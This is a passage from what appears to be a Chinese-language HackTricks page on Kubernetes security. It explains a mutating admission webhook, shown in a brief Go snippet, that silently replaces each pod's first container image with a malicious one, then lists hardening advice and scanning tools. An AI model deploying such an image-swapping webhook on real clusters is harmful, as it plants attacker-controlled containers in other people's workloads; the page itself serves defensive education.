如上图所示，我们尝试运行镜像 `nginx`，但最终执行的镜像是 `rewanthtammana/malicious-image`。到底发生了什么！！？

#### 技术细节 <a href="#heading-technicalities" id="heading-technicalities"></a>

我们将揭示刚刚发生的事情。您执行的 `./deploy.sh` 脚本创建了一个变异的 Webhook 准入控制器。下面的代码片段是变异的 Webhook 准入控制器负责上述结果的原因。
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
以上代码段将每个Pod中的第一个容器镜像替换为`rewanthtammana/malicious-image`。

## 最佳实践

### **防止Pod上的服务账户令牌自动挂载**

在创建Pod时，它会自动挂载一个服务账户（默认为同一命名空间中的默认服务账户）。并非每个Pod都需要在其内部使用API。

从1.6+版本开始，可以使用`automountServiceAccountToken: false`来防止Pod上的服务账户令牌自动挂载。它可以用于服务账户或Pod。

在服务账户上添加如下内容：\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

也可以在Pod上使用：\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **授予特定用户RoleBindings\ClusterRoleBindings**

在创建RoleBindings\ClusterRoleBindings时，请确保只有需要该绑定中角色的用户在内。很容易忘记不再相关的用户在这些组中。

### **使用Roles和RoleBindings而不是ClusterRoles和ClusterRoleBindings**

使用ClusterRoles和ClusterRoleBindings时，它适用于整个集群。此类组中的用户在所有命名空间上都具有权限，这有时是不必要的。Roles和RoleBindings可以应用于特定的命名空间，并提供另一层安全性。

### **使用自动化工具**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **参考资料**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
